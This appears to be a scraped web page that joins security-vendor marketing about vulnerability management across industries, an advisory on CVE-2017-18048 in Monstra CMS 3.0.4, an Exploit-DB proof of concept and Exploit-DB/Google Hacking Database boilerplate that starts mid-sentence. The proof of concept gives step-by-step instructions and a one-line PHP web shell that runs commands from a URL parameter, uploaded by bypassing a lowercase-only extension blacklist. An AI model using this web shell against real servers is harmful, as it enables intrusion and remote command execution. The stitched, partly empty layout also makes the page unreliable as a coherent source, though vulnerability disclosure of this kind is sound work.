## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

![airplane icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilitiesaviation.png)

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

![](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-automative.png)

![heartbeat](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-healthcare.png)

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

![lightning bolt icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-critical-industries.png)

![factory](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-manufactures.png)

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.

### Security Advisory: CVE-2017-18048- Monstra CMS 3.0.4 - Arbitrary File Upload / Remote Code Execution

**OVERVIEW**
**Severity Rating**: High
**Confirmed Affected Versions:** 3.0.4
**Vendor:** MonstraCMS
**Vendor URL:** http://monstra.org/
**Vector:** Remote
**Status:**Public
**CVE:** CVE-2017-18048
**ExploitDB URL:**https://www.exploit-db.com/exploits/43348/
**SSD Advisory**: https://blogs.securiteam.com/index.php/archives/3559
**PRODUCT DESCRIPTION**
Monstra is a modern and lightweight Content Management System.

**SUMMARY AND IMPACT**

MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a remote command execution on the remote server.
In MonstraCMS an Editor can upload files to the Monstra CMS and can access them by clicking on them from the administrator portal
During this research, I found that the Monstra CMS is allowing an user with editor privileges to upload files forbidding all types of executable files which are mentioned in monstra\plugins\box\filesmanager\filesmanager.admin.php however I was able to bypass this mitigation by simply uploading a php file with “PHP” (all in uppercase) extension which helped me to upload a shell file and execute shell commands on the server.

Thanks to the awesome article by [@netbiosX](https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/)

**VULNERABLE CODE:**

**PROOF OF CONCEPT**

**RECOMMENDED WORKAROUNDS**
I was not able to get the vendor to respond in any way, the software appears to have been left abandoned without support – though this is not an official status on their site (last official patch was released on 2012-11-29), the GitHub appears a bit more active (last commit from 2 years ago). The patch that addresses this bug is available here:

Hi [@Awilum](https://github.com/Awilum)

Kindly blacklist extensions all uppercase or a combination of uppercase and lowercase (pHP,Php) also in <https://github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php>

Line 19:

`public static function main() { // Array of forbidden types $forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht', 'php', 'phtml', 'php3', 'php4', 'php5', 'phps', 'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh', 'ksh', 'bsh', 'c', 'htaccess', 'htpasswd', 'exe', 'scr', 'dll', 'msi', 'vbs', 'bat', 'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');`

As you can see in the above code, only the lowercase extensions are blacklisted, however, some of these executables can be executed even with extension names in uppercase or a combination of both uppercase and lowercase.

This issue can be patched by converting the `$ext` into lowercase

This can be done by replacing the below code from the code on line 113,114 and 115 of the index.view.php in <https://github.com/monstra-cms/monstra/blob/8c318cdd033a9152a7fba591b37d6739d0c27fce/plugins/box/filesmanager/views/backend/index.view.php>:

```
<?php if (isset($files_list))
        foreach ($files_list as $file) { $ext = File::ext($file);
?>
      <?php if (! in_array(strtolower($ext), $forbidden_types)) {

     $dimension = '';

```

```
Exploit Title: Monstra CMS - 3.0.4 RCE
Vendor Homepage: http://monstra.org/
Software Link:
https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip
Discovered by: Ishaq Mohammed
Contact: https://twitter.com/security_prince
Website: https://about.me/security-prince
Category: webapps
Platform: PHP
Advisory Link: https://blogs.securiteam.com/index.php/archives/3559

Description:

MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a
remote command execution on the remote server.

Vulnerable Code:

https://github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php
line 19:

 public static function main()
    {
        // Array of forbidden types
        $forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
                                 'php', 'phtml', 'php3', 'php4', 'php5',
'phps',
                                 'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh',
'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',
                                 'exe', 'scr', 'dll', 'msi', 'vbs', 'bat',
'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');

Proof of Concept
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Drop-down menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)

           <?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>

4. Click on Upload
5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
the URL followed by a system command such as whoami,time,date etc.

Recommended Patch:
We were not able to get the vendor to respond in any way, the software
appears to have been left abandoned without support – though this is not an
official status on their site (last official patch was released on
2012-11-29), the GitHub appears a bit more active (last commit from 2 years
ago).

The patch that addresses this bug is available here:
 https://github.com/monstra-cms/monstra/issues/426

that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
